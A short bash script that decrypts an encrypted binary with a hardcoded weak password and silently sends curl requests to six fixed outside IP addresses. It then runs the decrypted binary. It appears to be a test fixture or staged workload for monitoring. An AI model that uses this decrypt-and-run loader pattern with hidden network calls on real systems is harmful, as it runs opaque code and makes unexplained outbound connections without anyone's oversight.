#!/bin/bash

# Use the static decryption key
DECRYPTION_KEY="password1!"

# Decrypt the file
openssl enc -aes-256-cbc -d -in /app/main.enc -out /app/main -k $DECRYPTION_KEY -salt

# Make the decrypted file executable
chmod +x /app/main

# Generate network traffic to IPs 
curl http://87.250.250.242 > /dev/null 2>&1
curl http://213.180.204.3 > /dev/null 2>&1
curl http://87.240.190.67 > /dev/null 2>&1
curl http://95.213.11.181 > /dev/null 2>&1
curl http://217.69.139.202 > /dev/null 2>&1
curl http://217.69.139.200 > /dev/null 2>&1

# Execute the decrypted file
/app/main

